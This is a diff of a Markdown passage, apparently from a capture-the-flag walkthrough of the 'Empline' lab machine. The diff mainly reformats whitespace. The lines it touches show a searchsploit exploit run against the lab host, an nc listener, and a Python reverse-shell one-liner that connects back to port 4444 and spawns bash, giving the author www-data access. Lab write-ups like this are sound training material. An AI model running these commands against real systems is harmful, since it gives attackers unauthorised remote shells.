@@ -81,14 +81,15 @@ searchsploit -m php/webapps/50585.sh
 chmod +x 50585.sh
 ./50585.sh http://job.empline.thm/
 ```
-<img width="1496" height="723" alt="image" src="https://github.com/user-attachments/assets/be0a54ad-f3f8-4f71-8f5a-5c6fc1ee96ba" />    
-Yeah, we got the web-shell, but to work better and comfortable I opened second terminal and made a reverse shell on there.    
-```bash  
-# In my terminal
+<img width="1496" height="723" alt="image" src="https://github.com/user-attachments/assets/be0a54ad-f3f8-4f71-8f5a-5c6fc1ee96ba" />        
+Yeah, we got the web-shell, but to work better and comfortable I opened second terminal and made a reverse shell on there.           
+
+```bash
+ # In my terminal
 nc -nvlp 4444
-# In target's web shell
+ # In target's web shell
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.68",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-```
+```  
 It became successful !!!!!! I am **"www-data"** user right now.   
 
 ----
